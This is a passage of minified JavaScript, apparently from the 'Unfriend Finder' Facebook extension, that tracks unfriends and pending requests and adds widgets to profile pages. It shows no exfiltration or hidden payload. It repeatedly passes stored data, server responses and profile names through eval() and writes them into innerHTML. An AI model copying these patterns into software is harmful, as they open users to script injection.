core.alwaysHide.Add(uid,(core.unfriends.Items[uid]?core.unfriends.Items[uid]:uid));Registry.setKey(core.user_id+"_alwaysHide",core.alwaysHide.toString());core.removeUnfriend(uid)},disabled:false,closer:true,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.alwaysHideFacebox.Show()}else{if(/\sctrlShifted/.test(Params.body.className)){try{core.dialogs.blockUnfriendFacebox=new Facebox({id:"blockUnfriendFacebox",title:LANG.block,body:LANG.hide_perm.replace("{name}",evalName(core.unfriends.Items[uid].name)),picture:Params.protocol+"//graph.facebook.com/"+uid+"/picture?type=normal",buttons:[{name:"blockUnfriend",value:LANG.block,id:"blockUnfriend_button",handler:function(){core.alwaysHide=new CollectionList(eval(Registry.getKey(core.user_id+"_alwaysHide","({})")));
core.alwaysHide.Add(uid,core.unfriends.Items[uid]);Registry.setKey(core.user_id+"_alwaysHide",core.alwaysHide.toString());core.removeUnfriend(uid)},disabled:false,closer:true,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.blockUnfriendFacebox.Show()}catch(exception){new ErrorHandler(exception,"display(blockUnfriendFacebox)")}}else{core.removeUnfriend(uid)}}};core.removeUnfriend=function removeUnfriend(uid){trace();
var element;if(core.unfriends.Items[uid]){if(Params.settings.deactivated){if(core.unfriends.Items[uid].status=="deactivated"){Params.deactivatedInRow++}else{if(Params.deactivatedInRow<5){Params.deactivatedInRow=0}else{Params.deactivatedInRow++}}if(Params.deactivatedInRow==5){setTimeout(function(){core.dialogs.disableDeactivatedProfiles=new Facebox({id:"disableDeactivatedProfiles",title:"Disable deactivated profiles",body:'<div style="padding-right:5px;">You choose to hide five deactivated profiles in a row, do you want to hide deactivated profiles from the list in the future ?<br /><br />You will be able to re-enable the option later in the settings.</div>',buttons:[{name:"ok",value:LANG.btn_ok,id:"next_button",handler:function(){Params.settings.deactivated=false;
saveSettings();getFromId("deactivated").checked=false},disabled:false,closer:true,type:"green"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]})},1000)}}core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));core.unfriends.Remove(uid);Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}},"removeUnfriend");
element=getFromId(uid);core.slideRemove(element);if((core.unfriends.Count()==0)&&(core.reappeared.Count()>0)){CSS3.setClass((new xPathSelector("//*[@id='groupReappeared']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup")}setTimeout(function(){if((core.unfriends.Count()==0)&&(core.reappeared.Count()==0)&&(getFromId("homeUnfriends"))){core.layer._showNoUnfriends()}},1000)}};core.clickToRemoveA=function clickToRemoveA(uid){trace();core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));
var awaitingList=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingList","({})")));core.awaitingsIgnored.Remove(uid);Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString());core.slideRemove(getFromId(uid));setTimeout(function(){if((awaitingList.Count()==0)&&(core.awaitingsIgnored.Count()==0)&&(getFromId("homeUnfriends"))){core.layer._showNoAwaitings()}},1000)};core.removeFromReappeared=function removeFromReappeared(uid){trace();core.reappeared=new CollectionList(eval(Registry.getKey(core.user_id+"_reappeared","({})")));
core.deactivated=new CollectionList(eval(Registry.getKey(core.user_id+"_deactivated","({})")));core.reappeared.Remove(uid);core.deactivated.Remove(uid);Registry.setKey(core.user_id+"_deactivated",core.deactivated.toString());Registry.setKey(core.user_id+"_reappeared",core.reappeared.toString());core.slideRemove(getFromId(uid));setTimeout(function(){if((core.unfriends.Count()==0)&&(core.reappeared.Count()==0)&&(getFromId("homeUnfriends"))){core.layer._showNoUnfriends()}},1000)};core.setName=function setName(uid,name,enabled){trace();
if(name){var element;if(element=getFromId("a_username__"+uid)){if(enabled){getFromId("a_username__"+uid).innerHTML=eval('"'+name+'"')}else{new xHTMLElement({element:"span",id:"a_username__"+uid,className:"UIObjectListing_Title",innerHTML:eval('"'+name+'"'),parentNode:element.parentNode,before:element}).getElement();element.parentNode.removeChild(element)}}}};core.setPicture=function setPicture(uid){trace();if(!Params.settings.updatePicture){return}try{void core.unfriends.Items[uid];if(core.unfriends.Items[uid]){if(core.unfriends.Items[uid].status=="deactivated"){return
}}}catch(exception){new ErrorHandler(exception,"core.setPicture()")}if(getFromId("img_userpic__"+uid)){getFromId("img_userpic__"+uid).src=Params.protocol+"//graph.facebook.com/"+uid+"/picture"}if(getFromId("itemBlock_userpic_"+uid)){getFromId("itemBlock_userpic_"+uid).src=Params.protocol+"//graph.facebook.com/"+uid+"/picture?type=normal"}core.doctor.heal()};core.setSubName=function setSubName(__constructor){trace();var icon;if(getFromId("span_data_subtext__"+__constructor.uid)){switch(__constructor.type){case"unfriend":icon='<i class="GenericStory_Icon img spritemap_icons sx_app_icons_unfriends" style="top:3px; position:relative"></i>';
break;case"awaiting":icon='<i class="GenericStory_Icon img spritemap_icons sx_app_icons_awaitings" style="top:3px; position:relative"></i>';break;case"hidden":icon='<i class="GenericStory_Icon img spritemap_icons sx_app_icons_deactivated" style="top:3px; position:relative"></i>';break;case"reappeared":icon='<i class="GenericStory_Icon img spritemap_icons sx_app_icons_reappeared" style="top:3px; position:relative"></i>';break;case"ignored":icon='<i class="GenericStory_Icon img spritemap_icons sx_app_icons_ignored" style="top:2px; position:relative"></i>';
break;case"newfriend":icon='<i class="GenericStory_Icon img spritemap_icons sx_app_icons_friend" style="top:3px; position:relative"></i>';break}if(!Params.settings.icons){icon=""}getFromId("span_data_subtext__"+__constructor.uid).innerHTML='<span class="uiStreamSource" style="color: gray;">'+__constructor.text+(Params.settings.uid?" <br><small>(uid: "+__constructor.uid+")</small>":"")+"</span>";if(getFromId("span_icon__"+__constructor.uid)){getFromId("span_icon__"+__constructor.uid).innerHTML=icon
}core.doctor.heal()}};core.getProfileName=function getProfileName(){trace();return getFromId("navAccountName").innerHTML};core.getName=function getName(){trace();var alt;if(/timelineLayout/.test(Params.body.className)){try{return getFromId("fbTimelineHeadline").getElementsByTagName("h2")[0].firstElementChild.innerHTML}catch(exception){return getFromId("timeline_sticky_header").getElementsByClassName("name")[0].getElementsByClassName("nameButton")[0].firstElementChild.innerHTML}}if(alt=getFromId("profile_pic").getAttribute("alt")){return alt
}if(getFromClass("profileName")[0]){return getFromClass("profileName")[0].innerHTML.replace(/\s<span\s(.+)<\/span>/,"")}if(getFromId("profile_name")){return getFromId("profile_name").innerHTML.replace(/\s<span\s(.+)<\/span>/,"").replace(/(\([^\)]+\))/,"")}};core.getId=function getId(){trace();var idName=(new xPathSelector(".//a[contains(@href, 'report/social.php?')]")).getSingleNodeValue();if(idName){if(/cid=([0-9]+)\&/.test(idName.href)){return idName.href.match(/cid=([0-9]+)\&/)[1]}}return 0};core.listenBodyInsertedNode=function listenBodyInsertedNode(e){if(e.target.tagName=="DIV"){if(/generic_dialog/.test(e.target.className)){trace();
core.timeoutMax=0;if(!core.timeout){core.timeout=setInterval(function(){var textContainer,button,body;if((new xPathSelector(".//div[contains(concat(' ', @class, ' '), ' dialog_buttons ')]")).getSingleNodeValue()){if(textContainer=(new xPathSelector(".//div[contains(concat(' ', @class, ' '), ' pop_content ')]//div[contains(concat(' ', @class, ' '), ' UIImageBlock_MED_Content ')]")).getSingleNodeValue()){if(button=(new xPathSelector(".//input[@name='remove-friend']")).getSingleNodeValue()){inject(function(){var s=document.createElement("span");
s.id="bindRemove";s.className=Dialog.getCurrent()._buttons[0].handler.match(/uid"?\s?:\s?"?([0-9]+)"?/)[1];document.body.appendChild(s)});button.style.outline="none";CSS3.addClass(button.parentNode,"uiButtonSpecial");CSS3.removeClass(button.parentNode,"uiButtonConfirm");EventMgr.addListener(button,EventMgr.EVENTS.click,function(){if(getFromId("bindRemove").className){core.watchRemove=getFromId("bindRemove").className;Registry.setKey(core.user_id+"_watchRemove",core.watchRemove);core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));
core.toNotify.Add(core.watchRemove,"no");Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString())}});if(!(new RegExp(LANG.wontAppear)).test(textContainer.innerHTML)){textContainer.innerHTML=textContainer.innerHTML+LANG.wontAppear}}clearInterval(core.timeout);delete core.timeout}}core.timeoutMax+=1;if(core.timeoutMax>100){clearInterval(core.timeout);delete core.timeout}},10)}}}e.stopPropagation()};core.buildTimelineBox=function buildTimelineBox(){trace();new xHTMLElement({element:"div",id:"timelineEscapeHatchUF",style:{display:"none"},className:"timelineEscapeHatch",innerHTML:parseTemplate('    <div class="fbTimelineSection mtm fbTimelineCompactSection">        <div class="escapeHatchHeader">            <span class="prm fsl fwb">'+Params._0x4d22+"</span>        </div>        <div></div>    </div>",{params:{}}),parentNode:getFromId("pagelet_escape_hatch"),before:getFromId("pagelet_escape_hatch").firstElementChild})
};core.appendTimelineBoxBlock=function appendTimelineBoxBlock(){trace();var escapeHatchHeader;if(escapeHatchHeader=getFromClass("escapeHatchHeader")[0]){new xHTMLElement({element:"div",id:"ufTimelineBoxBlock",className:"UIImageBlock clearfix "+(getFromId("timelineEscapeHatchUF")?"":"ufTimelineBoxBlock"),innerHTML:parseTemplate('            <div class="UIImageBlock_Content UIImageBlock_ICON_Content" id="ufTimelineBox"></div>',{params:{}}),parentNode:escapeHatchHeader.parentNode,after:escapeHatchHeader})
}core.doctor.heal()};core.loadCheckProfile=function loadCheckProfile(){trace();if(/timelineLayout/.test(Params.body.className)){if(getFromId("pagelet_escape_hatch")){var ufTimelineBox;if(!getFromId("ufTimelineBox")){core.buildTimelineBox();core.appendTimelineBoxBlock()}if(ufTimelineBox=getFromId("ufTimelineBox")){core.style.Append(".timelineEscapeHatch { position: relative; overflow: hidden; }\n.timelineEscapeHatch .fbTimelineCompactSection { padding: 20px 17px; }\n.timelineEscapeHatch .uiHeader { display: none; }\n.timelineEscapeHatch .uiCloseButton { position: absolute; right: 10px; top: 30px; }\n.timelineEscapeHatch #ufTimelineBox .uiCloseButton { position: relative; right: -2px; top: 1px; }\n.timelineEscapeHatch .profileInfoTable { width: 805px; }\n.timelineEscapeHatch .profileInfoTable .labelContainer { background-color: #FFFFFF; color: #99999; padding-left: 0px; padding-right: 15px; padding-top: 0px; text-align: left; }\n.timelineEscapeHatch .profileInfoTable .spacer { border-top: 1px solid #D6DEA7; }\n.timelineEscapeHatch .UIImageBlock_Content { left: 68px; line-height: 1.66; margin-right: 12px; margin-top: -5px; padding-top: 0px; position: absolute; }\n.ufTimelineBoxBlock { margin: -10px 0 0 5px; }\n.timelineLayout .timelineEscapeHatch .profileInfoTable th.label { padding-right: 0px; width: 170px; }\n",{params:{}});
ufTimelineBox.innerHTML=parseTemplate('           <ul id="pagelet_netego_uf_lists">               <li id="li_hasIgnored_::id::" style="display:none; margin-bottom:5px;" class="inCommonSectionList uiListItem uiListVerticalItemBorder">                   <table>                       <tr style="vertical-align:top">                           <td><i class="UIImageBlock_Image UIImageBlock_ICON_Image img spritemap_icons spritemap_icons_fix hasignored ufIcon"></i></td>                           <td><span class="visible" id="text_hasIgnored_::id::"></span></td>                           <td>                               <span class="uiTooltip buttonWrap">                                   <label style="position: relative; margin-top: -4px;" class="uiCloseButton uiCloseButtonSmall">                                      <input type="submit" id="reset_hasIgnored_::id::">                                   </label>                                   <span class="uiTooltipWrap middle right rightmiddle">                                      <span class="uiTooltipText">::hide::</span>                                   </span>                               </span>                           </td>                       </tr>                   </table>               </li>               <li id="li_wasUnfriend_::id::" style="display:none;" class="inCommonSectionList uiListItem uiListVerticalItemBorder">                   <table>                       <tr style="vertical-align:top">                           <td><i class="UIImageBlock_Image UIImageBlock_ICON_Image spritemap_icons wasunfriend ufIcon"></i></td>                           <td><span class="visible" id="text_wasUnfriend_::id::"></span></td>                           <td>                               <span class="uiTooltip buttonWrap">                                   <label style="position: relative; margin-top: -4px;" class="uiCloseButton uiCloseButtonSmall">                                       <input type="submit" id="reset_wasUnfriend_::id::">                                   </label>                                   <span class="uiTooltipWrap middle right rightmiddle">                                       <span class="uiTooltipText">::hide::</span>                                   </span>                               </span>                           </td>                       </tr>                   </table>               </li>           </ul>',{params:{id:core.getId(),hide:LANG.hide}});
core.fillUFProfileInfos(core.getId())}}}else{if(getFromId("profile_pic")){if(!core.getId()){return}var o={uid:core.getId()};var netEgo=getFromId("pagelet_netego");try{if(core.checkUID!=o.uid){core.checkUID=o.uid;var pagelet_uf=new xHTMLElement({element:"div",id:"pagelet_netego_uf",style:{display:CSS3.DISPLAY.none},innerHTML:parseTemplate('    <div class="mbl ego_column">       <div class="uiHeader uiHeaderTopAndBottomBorder mbs uiSideHeader">           <div class="clearfix uiHeaderTop">               <div>                   <h4 class="uiHeaderTitle">Unfriend Finder</h4>               </div>           </div>       </div>       <div class="phs" style="padding-left: 3px;">           <ul class="uiList ego_unit" id="pagelet_netego_uf_lists">               <li id="li_hasIgnored_::id::" style=" margin-bottom:5px; display:none;" class="inCommonSectionList uiListItem uiListVerticalItemBorder">                   <table>                       <tr style="vertical-align:top">                           <td><i class="UIImageBlock_Image UIImageBlock_ICON_Image img spritemap_icons spritemap_icons_fix hasignored ufIcon"></i></td>                           <td><span class="visible" id="text_hasIgnored_::id::"></span></td>                           <td>                               <span class="uiTooltip buttonWrap">                                   <label style="margin-top: -2px;" class="uiCloseButton uiCloseButtonSmall">                                      <input type="submit" id="reset_hasIgnored_::id::">                                   </label>                                   <span class="uiTooltipWrap middle right rightmiddle">                                      <span class="uiTooltipText">::hide::</span>                                   </span>                               </span>                           </td>                       </tr>                   </table>               </li>               <li id="li_wasUnfriend_::id::" style="display:none;" class="inCommonSectionList uiListItem uiListVerticalItemBorder">                   <table>                       <tr style="vertical-align:top">                           <td><i class="UIImageBlock_Image UIImageBlock_ICON_Image spritemap_icons wasunfriend ufIcon"></i></td>                           <td><span class="visible" id="text_wasUnfriend_::id::"></span></td>                           <td>                               <span class="uiTooltip buttonWrap">                                   <label style="margin-top: -2px;" class="uiCloseButton uiCloseButtonSmall">                                       <input type="submit" id="reset_wasUnfriend_::id::">                                   </label>                                   <span class="uiTooltipWrap middle right rightmiddle">                                       <span class="uiTooltipText">::hide::</span>                                   </span>                               </span>                           </td>                       </tr>                   </table>               </li>           </ul>       </div>    </div>',{params:{id:o.uid,hide:LANG.hide}}),parentNode:getFromId("pagelet_right_sidebar"),before:getFromId("pagelet_right_sidebar").firstElementChild}).getElement();
core.fillUFProfileInfos(o.uid)}if(getFromId("profile_action_remove_friend")){var c;if(getFromId("wasUnfriend")){c=getFromId("wasUnfriend").parentNode;c.removeChild(getFromId("wasUnfriend").nextElementSibling);c.removeChild(getFromId("wasUnfriend"))}if(getFromId("hasIgnored")){var c=getFromId("hasIgnored").parentNode;c.removeChild(getFromId("hasIgnored").nextElementSibling);c.removeChild(getFromId("hasIgnored"))}}}catch(exception){new ErrorHandler(exception,"core.checkNewProfile()")}}}core.doctor.heal()
};core.fillUFProfileInfos=function fillUFProfileInfos(uid){trace();var w;EventMgr.addListener(getFromId("reset_hasIgnored_"+uid),EventMgr.EVENTS.click,function(){try{core.hasIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_hasIgnored","({})")));if(w=getFromId("li_hasIgnored_"+uid)){w.parentNode.removeChild(w)}core.hasIgnored.Items[uid]=false;if(getFromId("pagelet_netego_uf")){if((new xPathSelector("//ul[@id='pagelet_netego_uf_lists']/li")).numberValues()==0){CSS3.hide(getFromId("pagelet_netego_uf"))
}}Registry.setKey(core.user_id+"_hasIgnored",core.hasIgnored.toString());if(getFromId("ufTimelineBox")){if((new xPathSelector("//ul[@id='pagelet_netego_uf_lists']/li")).numberValues()==0){if(!getFromId("ufTimelineBoxBlock").previousElementSibling.tagName){CSS3.hide(getFromId("pagelet_escape_hatch"))}else{CSS3.hide(getFromId("timelineEscapeHatchUF"))}}}}catch(exception){new ErrorHandler(exception,"reset_hasIgnored_"+uid+".click")}});EventMgr.addListener(getFromId("reset_wasUnfriend_"+uid),EventMgr.EVENTS.click,function(){try{core.wasUnfriend=new CollectionList(eval(Registry.getKey(core.user_id+"_wasUnfriend","({})")));
if(w=getFromId("li_wasUnfriend_"+uid)){w.parentNode.removeChild(w)}core.wasUnfriend.Items[uid]=false;if(getFromId("pagelet_netego_uf")){if((new xPathSelector("//ul[@id='pagelet_netego_uf_lists']/li")).numberValues()==0){CSS3.hide(getFromId("pagelet_netego_uf"))}}Registry.setKey(core.user_id+"_wasUnfriend",core.wasUnfriend.toString());if(getFromId("ufTimelineBox")){if((new xPathSelector("//ul[@id='pagelet_netego_uf_lists']/li")).numberValues()==0){if(!getFromId("ufTimelineBoxBlock").previousElementSibling.tagName){CSS3.hide(getFromId("pagelet_escape_hatch"))
}else{CSS3.hide(getFromId("timelineEscapeHatchUF"))}}}}catch(exception){new ErrorHandler(exception,"reset_wasUnfriend_"+uid+".click")}});if(core.hasIgnored.Items[uid]){try{getFromId("text_hasIgnored_"+uid).innerHTML=core.getName()+" "+LANG.hasignored.replace(".","")+". "+genTime(core.hasIgnored.Items[uid].time);CSS3.display(getFromId("li_hasIgnored_"+uid),CSS3.DISPLAY.block);if(getFromId("pagelet_netego_uf")){CSS3.display(getFromId("pagelet_netego_uf"),CSS3.DISPLAY.block)}if(getFromId("timelineEscapeHatchUF")){CSS3.display(getFromId("timelineEscapeHatchUF"),CSS3.DISPLAY.block)
}}catch(exception){new ErrorHandler(exception);getFromId("text_hasIgnored_"+uid).innerHTML=core.getName()+" "+LANG.hasignored.replace(".","");CSS3.display(getFromId("li_hasIgnored_"+uid),CSS3.DISPLAY.block);if(getFromId("pagelet_netego_uf")){CSS3.display(getFromId("pagelet_netego_uf"),CSS3.DISPLAY.block)}if(getFromId("timelineEscapeHatchUF")){CSS3.display(getFromId("timelineEscapeHatchUF"),CSS3.DISPLAY.block)}}}else{if(w=getFromId("li_hasIgnored_"+uid)){w.parentNode.removeChild(w)}}if(core.wasUnfriend.Items[uid]){try{getFromId("text_wasUnfriend_"+uid).innerHTML=core.getName()+" "+LANG.wasunfriend.replace(".","")+". "+genTime(core.wasUnfriend.Items[uid].time);
CSS3.display(getFromId("li_wasUnfriend_"+uid),CSS3.DISPLAY.block);if(getFromId("pagelet_netego_uf")){CSS3.display(getFromId("pagelet_netego_uf"),CSS3.DISPLAY.block)}if(getFromId("timelineEscapeHatchUF")){CSS3.display(getFromId("timelineEscapeHatchUF"),CSS3.DISPLAY.block)}}catch(exception){new ErrorHandler(exception);getFromId("text_wasUnfriend_"+uid).innerHTML=core.getName()+" "+LANG.wasunfriend.replace(".","");CSS3.display(getFromId("li_wasUnfriend_"+uid),CSS3.DISPLAY.block);if(getFromId("pagelet_netego_uf")){CSS3.display(getFromId("pagelet_netego_uf"),CSS3.DISPLAY.block)
}if(getFromId("timelineEscapeHatchUF")){CSS3.display(getFromId("timelineEscapeHatchUF"),CSS3.DISPLAY.block)}}}else{if(w=getFromId("li_wasUnfriend_"+uid)){w.parentNode.removeChild(w)}}if(getFromId("ufTimelineBox")){if((new xPathSelector("//ul[@id='pagelet_netego_uf_lists']/li")).numberValues()==0){if(!getFromId("ufTimelineBoxBlock").previousElementSibling.tagName){CSS3.hide(getFromId("pagelet_escape_hatch"))}else{CSS3.hide(getFromId("ufTimelineBoxBlock"))}}}};core.checkNewProfile=function checkNewProfile(){trace()
};core.updateProfilePic=function updateProfilePic(uid){trace();try{void core.unfriends.Items[uid];if(core.unfriends.Items[uid]){if(core.unfriends.Items[uid].status=="deactivated"){return}}}catch(exception){new ErrorHandler(exception,"core.updateProfilePic("+uid+")")}if(!Params.settings.updatePicture){return}core.setPicture(uid);core.doctor.heal()};core.removeConnectionWith=function(__constructor){trace();if(!core.uf_fb_dtsg){return}var dataToPost,divContent=getFromId("div_rightContent_"+__constructor.uid),element=getFromId(__constructor.uid),d=divContent.innerHTML;
divContent.innerHTML="<span style=\"margin-top:5px; background:transparent url('"+Params.images.smallIndicator+"') no-repeat scroll left top; height:11px; width:16px; z-index:2; display:block;\"></span>";if(__constructor.uid>1){dataToPost="friend="+__constructor.uid+"&confirmed=1&__user="+core.user_id+"&fb_dtsg="+core.uf_fb_dtsg;Ajax({method:"post",headers:Params.Ajax.Headers,url:Params.protocol+"//"+Params.host+"/ajax/friends/requests/cancel.php?__a=1",data:dataToPost,onload:function(data){Console.log("Removing connection with uid "+__constructor.uid);
var isSuccess=false;try{if(myJson=eval("("+data.replace("for (;;);","")+")")){if(myJson.payload==null){isSuccess=false}else{isSuccess=myJson.payload.success}}else{isSuccess=false}}catch(exception){new ErrorHandler(exception,"core.removeConnectionWith()")}isSuccess=true;if(isSuccess){Console.log("Connection removed with uid "+__constructor.uid);core.keepAwaitingList=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingList","({})")));core.keepAwaitingList.Remove(__constructor.uid);Registry.setKey(core.user_id+"_keepAwaitingList",core.keepAwaitingList.toString());
core.awaitingList=core.keepAwaitingList;core.slideRemove(element);core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));core.toNotify.Add(__constructor.uid,"no");Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString());var awaitingList=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingList","({})")));core.filter.loadingIndicator("awaitings",false);core.filter.setValue({awaitings:{counter:{value:awaitingList.Count()}}},"getStatus");if((awaitingList.Count()==0)&&(core.awaitingsIgnored.Count()==0)){setTimeout(function(){core.layer._showNoAwaitings()
},1000)}if((new xPathSelector("//*[@id='pendingContentUL']/li")).numberValues()==0){CSS3.hide(getFromId("groupPending"))}}else{if(getFromId("homeUnfriends")){if(/selectedItem/.test(getFromId("UFfilterAwaitings").parentNode.className)){divContent.innerHTML=d;EventMgr.addListener(getFromId("a_removeLink"+__constructor.uid),EventMgr.EVENTS.click,function(){core.removeConnectionWith({uid:__constructor.uid})})}}core.loadErrorConnectionFacebox(myJson)}},onerror:function(data){if(getFromId("homeUnfriends")){if(/selectedItem/.test(getFromId("UFfilterAwaitings").parentNode.className)){divContent.innerHTML=d;
EventMgr.addListener(getFromId("a_removeLink"+__constructor.uid),EventMgr.EVENTS.click,function(){core.removeConnectionWith({uid:__constructor.uid})})}}core.loadErrorConnectionFacebox(null)}})}};core.updatePermanant=function updatePermanant(){trace();core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));var item,current;for(item in core.unfriends.Items){if(core.unfriends.Items.hasOwnProperty(item)){if(current=core.unfriends.Items[item]){if(core.friends.Items[current.uid]){core.wasUnfriend.Remove[current.uid]
}else{core.wasUnfriend.Add(current.uid,{uid:current.uid,time:current.time})}}}}item=null;current=null;for(item in core.awaitingsIgnored.Items){if(core.awaitingsIgnored.Items.hasOwnProperty(item)){if(current=core.awaitingsIgnored.Items[item]){if(core.friends.Items[current.uid]){core.hasIgnored.Remove(current.uid)}else{core.hasIgnored.Add(current.uid,{uid:current.uid,time:current.time})}}}}Registry.setKey(core.user_id+"_wasUnfriend",core.wasUnfriend.toString());Registry.setKey(core.user_id+"_hasIgnored",core.hasIgnored.toString())
};core.becomeFan=function becomeFan(__constructor){trace();if(!core.uf_fb_dtsg){return}Ajax({method:"post",async:"false",headers:Params.Ajax.Headers,url:Params.protocol+"//"+Params.host+"/ajax/pages/fan_status.php?__a=1",data:"__a=1&add=1&reload=1&fan_origin=page_profile&nctr[_mod]=pagelet_header&fb_dtsg="+core.uf_fb_dtsg+"&fbpage_id="+__constructor.id+"&preserve_tab=1&__user="+core.user_id,onload:function(data){if(__constructor.reload){core.href(Params.protocol+"//"+Params.host+"/pages/pagename/"+__constructor.id)
}}});core.doctor.heal()};core.updateUsage=function updateUsage(){trace();var usage=Registry.getKey(core.user_id+"_usage","0");++usage;Registry.setKey(core.user_id+"_usage",usage);return usage};core.getUsage=function getUsage(){trace();return parseInt(Registry.getKey(core.user_id+"_usage","0"),10)};core.checkFanGroupStatus=function checkFanGroupStatus(){return;trace();Ajax({method:"get",async:false,headers:Params.Ajax.Headers,url:Params.protocol+"//"+Params.host+"/ajax/typeahead/first_degree.php",onload:function(data){if(myJson=eval("("+data.replace("for (;;);","")+")")){try{if(myJson.payload.entries.length>0){myJson.payload.entries.forEach(function(entry){if(entry.uid=="120349238092887"){Params.isFan=true
}if(entry.uid=="98534953863"){Params.groupJoined=true}});core.applyFanGroupStatus()}}catch(exception){}}},onerror:function(data){}});core.doctor.heal()};core.applyFanGroupStatus=function applyFanGroupStatus(){trace();if(Params.isFan){if(getFromId("becomeFan_title")){getFromId("becomeFan_title").href=Params.links.page}}else{if(getFromId("becomeFan_title")){getFromId("becomeFan_title").href="#";EventMgr.addListener(getFromId("becomeFan_title"),EventMgr.EVENTS.click,function(){core.becomeFan({id:"120349238092887",reload:true})
});if(core.getUsage()>15){helps=eval(Registry.getKey(core.user_id+"_helps","({})"));if(helps.suggestLike){return}if(core.dialogs.suggestLike){return}if(!getFromId("iconHeader")){return}core.dialogs.suggestLike=new ContextualDialog({id:"suggestLike",width:530,title:'<i class="img miniLike"></i> Do you like Unfriend Finder ?',body:parseTemplate('<br />They are many things you can do if you like Unfriend Finder !<ul class="suggestLike">     <li>         Like the page on Facebook         <br /><iframe frameborder="0" scrolling="no" allowtransparency="true" style="height: 30px; overflow: hidden; width: 500px; margin-top:10px; margin-left:10px;" src="::src::"></iframe>     </li>     <li>Spread the word (not to people you don\'t like, obviously !) : share it with your friends !</li></ul>Thank you for using Unfriend Finder!',{params:{src:"https://www.facebook.com/plugins/like.php?href=http://www.facebook.com/pages/Unfriend-Finder/120349238092887&show_faces=false&action=like&font=lucida+grande&colorscheme=light&layout=button&height=30",donate:Params.links.donate}}),context:getFromId("iconHeader"),arrow:"top-left",align:"middle",overlay:false,halo:false,close:function(){helps=eval(Registry.getKey(core.user_id+"_helps","({})"));
helps.suggestLike=true;Registry.setKey(core.user_id+"_helps",stringify(helps))},buttons:{like:true,close:true}});core.dialogs.suggestLike.Show()}}}};core.hideContentArea=function hideContentArea(){trace();if(getFromId("contentArea")){CSS3.addClass(document.body,"uflist")}else{Console.log("setTimeout core.hideContentArea");setTimeout(core.hideContentArea,10)}core.doctor.heal()};core.deferRemoveConnection=function deferRemoveConnection(__constructor){trace();setTimeout(function(){core.removeConnectionWith({uid:__constructor.uid});
if(__constructor.last){CSS3.hide(getFromId("cancelallindicator"));CSS3.display(getFromId("cancelall"),CSS3.DISPLAY.block)}},__constructor.delay)};core.hideOrCancelFromHeader=function hideOrCancelFromHeader(from){switch(from){case"unfriends":core.setTimeoutHide=setTimeout(function(){if(!confirm(LANG.btn_confirm+" ?")){return}CSS3.setClass((new xPathSelector("//*[@id='groupReappeared']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup");core.unfriends=new (CollectionList);
Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());core.filter.setValue({unfriends:{counter:{value:0}}});CSS3.hide(getFromId("groupUnfriends"));if(core.reappeared.Count()==0){CSS3.display(getFromId("noUnfriends"),CSS3.DISPLAY.block)}core.updateHeadersPosition();core.filter.loadingIndicator("unfriends",false)},10);break;case"reappeared":core.setTimeoutHide=setTimeout(function(){if(!confirm(LANG.btn_confirm+" ?")){return}core.reappeared=new (CollectionList);Registry.setKey(core.user_id+"_reappeared",core.reappeared.toString());
CSS3.hide(getFromId("groupReappeared"));if((core.reappeared.Count()==0)&&(core.unfriends.Count()==0)){CSS3.display(getFromId("noUnfriends"),CSS3.DISPLAY.block)}core.updateHeadersPosition()},10);break;case"helpreappeared":core.setTimeoutHide=setTimeout(function(){if(!core.dialogs.helpreappearedContextual){core.dialogs.helpreappearedContextual=new ContextualDialog({id:"helpreappearedContextual",title:'<span class="en_US">What is the "reappeared" section ?</span><span class="fr_FR">À quoi correspond la section des amis réapparus?</span>',body:'<span class="en_US">This section shows you your friends who have deactivated their profiles, and which have reactivated after.<br /><u>Those friends are still in your friendlist.</u></span><span class="fr_FR">Cette section vous montre qui de vos amis ont réactivé leur profils après l\'avoir désactivé.<br /><u>Ces profils sont toujours dans votre liste d\'amis.</u></span>',context:getFromId("helpreappeared"),align:"middle",arrow:"top-left",buttons:{close:true}})
}core.dialogs.helpreappearedContextual.Show()},10);break;case"pending":core.setTimeoutHide=setTimeout(function(){if(!core.dialogs.cancelAllFacebox){core.dialogs.cancelAllFacebox=new Facebox({id:"cancelAllFacebox",title:'<span class="en_US">Cancel all your Pending Requests</span><span class="fr_FR">Annuler toutes vos demandes d\'ami en attente</span>',body:'<span class="en_US">Are you sure you want to cancel all your pending requests ?<br />This might take a while depending on the number of requests you have sent.</span><span class="fr_FR">Êtes vous sûr de vouloir annuler toutes vos demandes d\'ami en attente ?<br />Ce processus peut prendre plus ou moins de temps selon le nombre de requêtes.</span>',buttons:[{name:"confirm_cancel",value:LANG.btn_ok,id:"confirm_button",handler:function(){core.dialogs.cancelAllFacebox.Destroy();
